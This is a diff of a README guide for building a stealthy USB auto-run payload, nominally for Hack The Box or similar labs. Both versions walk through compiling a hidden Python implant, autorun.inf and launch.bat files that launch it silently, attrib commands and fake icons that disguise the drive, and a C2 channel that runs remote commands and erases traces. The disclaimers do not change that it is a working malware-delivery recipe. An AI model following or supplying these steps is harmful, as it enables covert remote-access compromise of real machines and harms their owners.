@@ -1,153 +1,125 @@
-# **USB Auto-Execution Payload - Beginner's Guide**  
-**For Authorized Penetration Testing Labs Only**  
+# **USB Auto-Execution Payload - HTB/CTS Lab Guide**  
+**For Authorized Penetration Testing Only**  
 
 ---
 
 ## **📌 Table of Contents**  
 1. [What This Does](#-what-this-does)  
 2. [Requirements](#-requirements)  
-3. [Step-by-Step Setup](#-step-by-step-setup)  
-4. [How to Use](#-how-to-use)  
-5. [Safety Notes](#⚠️-safety-notes)  
+3. [USB File Checklist](#-usb-file-checklist)  
+4. [Setup Guide](#-setup-guide)  
+5. [Testing & C2 Commands](#-testing--c2-commands)  
+6. [Safety & OPSEC](#⚠️-safety--opsec)  
 
 ---
 
 ## **🔍 What This Does**  
-This tool creates a **hidden program** that:  
-✅ Automatically runs when a USB is plugged in (no clicks needed)  
-✅ Connects to your computer secretly (for authorized testing)  
-✅ Can run commands you send it  
-✅ Hides itself completely (no windows or popups)  
-
-**Legal Use Only**: Designed for Hack The Box, CTF challenges, or cybersecurity labs with permission.  
+A stealthy USB payload for **HTB/CTS labs** that:  
+✅ Auto-runs on insertion (via `autorun.inf` + `launch.bat`)  
+✅ Calls back to your C2 server (HTB-provided IP)  
+✅ Executes commands remotely  
+✅ Self-hides (no windows/taskbar traces)  
 
 ---
 
 ## **📋 Requirements**  
-### **🛠️ Tools Needed**  
-1. **Windows 10/11 PC** (for testing)  
-2. **USB Flash Drive** (formatted as FAT32)  
-3. **Python 3.8+** ([Download here](https://www.python.org/downloads/))  
-4. **Git** (optional, [Download here](https://git-scm.com/))  
+### **🛠️ Tools**  
+- **Windows PC** (for compiling/testing)  
+- **USB Drive (FAT32 formatted)**  
+- **Python 3.8+** + `pip install pyinstaller pycryptodomex pywin32`  
 
-### **📦 Python Libraries**  
-Install these first:  
-```bash
-pip install pyinstaller pycryptodomex pywin32
-```
+### **🔑 HTB/CTS Lab Info**  
+- **C2 Server IP**: Provided in lab instructions (replace `YOUR_C2_IP` in `lab.py`)  
+- **Target OS**: Windows (AutoRun may be disabled; manual execution might be needed)  
 
 ---
 
-## **🔧 Step-by-Step Setup**  
+## **📂 USB File Checklist**  
+Copy **these files to the USB root**:  
+| File           | Purpose                                  | Hidden? |  
+|----------------|------------------------------------------|---------|  
+| `payload.exe`  | Compiled malware (from `lab.py`)         | Yes     |  
+| `autorun.inf`  | Triggers `launch.bat` on USB insertion   | Yes     |  
+| `launch.bat`   | Runs `payload.exe` silently              | Yes     |  
+| `desktop.ini`  | Displays a fake "Documents" icon (optional) | Yes     |  
+
+### **🚨 Critical Notes**  
+- **Hide files**: Run in CMD (after copying):  
+  ```cmd
+  attrib +h +s payload.exe autorun.inf launch.bat desktop.ini
+  ```  
+- **Name `payload.exe` something innocent** (e.g., `setup.exe`) if AutoRun is blocked.  
+
+---
+
+## **🔧 Setup Guide**  
 
 ### **1️⃣ Generate RSA Keys**  
-*(Skip if you already have a key pair)*  
-
-#### **Method A: Using Python**  
-Run this in a Python shell:  
+Run `generate_key.py` → Copy the **public key** into `lab.py`:  
 ```python
-from Cryptodome.PublicKey import RSA
-key = RSA.generate(2048)
-print("Public Key:\n", key.publickey().export_key().decode())
+RSA_PUB_KEY = """-----BEGIN PUBLIC KEY-----
+PASTE_YOUR_KEY_HERE
+-----END PUBLIC KEY-----"""
 ```  
-➡️ **Copy the printed public key** (save it for Step 2).  
 
-#### **Method B: Using OpenSSL (Advanced)**  
+### **2️⃣ Compile `payload.exe`**  
 ```bash
-openssl genrsa -out private.pem 2048
-openssl rsa -in private.pem -pubout -out public.pem
+pyinstaller --onefile --noconsole --clean lab.py -n payload
 ```  
-➡️ Open `public.pem` and copy its contents.  
+➡️ Output: `dist/payload.exe` → Copy to USB.  
+
+### **3️⃣ Configure `autorun.inf`**  
+Ensure it matches:  
+```ini
+[AutoRun]
+open=launch.bat
+shellexecute=launch.bat
+action=Open folder to view files
+label=Backup Drive  ; Match HTB lab theme
+icon=shell32.dll,4  ; Generic folder icon
+```  
 
 ---
 
-### **2️⃣ Update `lab.py`**  
-1. Open `lab.py` in a text editor (like Notepad++ or VS Code).  
-2. Find this section:  
-   ```python
-   RSA_PUB_KEY = """-----BEGIN PUBLIC KEY-----
-   PASTE_YOUR_2048_BIT_PUBLIC_KEY_HERE
-   -----END PUBLIC KEY-----"""
-   ```  
-3. **Paste your public key** between the `"""` quotes.  
-   - ✅ **Must include** `BEGIN/END PUBLIC KEY` lines.  
-   - ❌ **No extra spaces** before/after the key.  
+## **🚀 Testing & C2 Commands**  
 
----
-
-### **3️⃣ Compile to EXE**  
-1. Open **Command Prompt** in the folder where `lab.py` is saved.  
-2. Run:  
-   ```bash
-   pyinstaller --onefile --noconsole --clean lab.py -n payload
-   ```  
-   This creates `payload.exe` in the `dist` folder.  
-
----
-
-### **4️⃣ Prepare the USB**  
-1. **Format USB as FAT32** (Right-click → Format → FAT32).  
-2. Copy `payload.exe` to the **root of the USB** (not inside any folder).  
-3. **First Run Setup**:  
-   - Plug USB into your test machine.  
-   - Manually run `payload.exe` **once**. It will:  
-     - Create hidden `autorun.inf` and `launch.bat` files.  
-     - Set up auto-run for future USB insertions.  
-
----
-
-## **🚀 How to Use**  
-### **🔌 Auto-Run on USB Insertion**  
-After the first setup:  
-1. Plug the USB into any **test machine**.  
-2. The payload runs **automatically** (no clicks needed).  
-3. Check your C2 server for connections.  
-
-### **🖥️ Manual Testing**  
-1. Run `payload.exe` directly on the test machine.  
-2. It will:  
-   - Hide itself (no windows).  
-   - Connect to your C2 server.  
+### **🔌 Execution Methods**  
+1. **AutoRun (If enabled in lab)**:  
+   - Plug USB → `autorun.inf` → `launch.bat` → `payload.exe`.  
+2. **Manual (If AutoRun fails)**:  
+   - Double-click `launch.bat` or `payload.exe`.  
 
 ### **📡 C2 Server Commands**  
-Send these from your server:  
-- `exec [command]`: Run system commands (e.g., `exec whoami`).  
-- `cleanup`: Remove traces and exit.  
+Send these from your C2 (HTB lab server):  
+| Command          | Action                          |  
+|------------------|---------------------------------|  
+| `exec whoami`    | Runs `whoami` on target         |  
+| `cleanup`        | Self-destructs + removes traces |  
 
 ---
 
-## **⚠️ Safety Notes**  
-1. **Only use in authorized environments** (labs, HTB, CTFs).  
-2. **Disable autorun on personal PCs**:  
-   ```powershell
-   Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name NoDriveTypeAutoRun -Value 0x95
-   ```  
-3. **Clean up after testing**:  
-   - The payload auto-removes traces when done.  
-   - Format the USB afterward.  
+## **⚠️ Safety & OPSEC**  
+1. **Lab Restrictions**:  
+   - HTB may block AutoRun → Use manual execution.  
+   - Firewalls may block C2 → Check lab instructions.  
+2. **Cleanup**:  
+   - `payload.exe` auto-removes traces on `cleanup`.  
+   - Format USB after testing.  
 
 ---
 
 ## **❓ Troubleshooting**  
-| Error | Fix |  
-|-------|-----|  
-| `No module 'Cryptodome'` | Run `pip install pycryptodomex` |  
-| `Incorrect padding` | Regenerate RSA keys and paste correctly |  
-| USB doesn’t auto-run | Enable autorun in VM:  
-  ```powershell
-  Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer -Name NoDriveTypeAutoRun -Value 0
-  ```  
+| Issue                  | Fix                                  |  
+|------------------------|--------------------------------------|  
+| `payload.exe` crashes  | Recompile with `--debug` flag        |  
+| No C2 connection       | Check `C2_SERVER` IP in `lab.py`     |  
+| AutoRun fails          | Manually run `launch.bat`            |  
 
 ---
 
 ## **📜 Final Notes**  
-- Test in a **virtual machine** first (e.g., VirtualBox).  
-- Document all activity for your lab reports.  
-- **Never use this on systems without permission.**  
+- **Test in a VM first** (e.g., VirtualBox with AutoRun enabled).  
+- **HTB/CTS may require adjustments** (ask instructors if stuck).  
+- **Never use outside authorized labs!**  
 
-🔐 **Happy ethical hacking!**  
-
---- 
-
-**✉️ Need help?**  
-Ask your instructor or lab supervisor for guidance.
+🔐 **Good luck with the challenge!**  
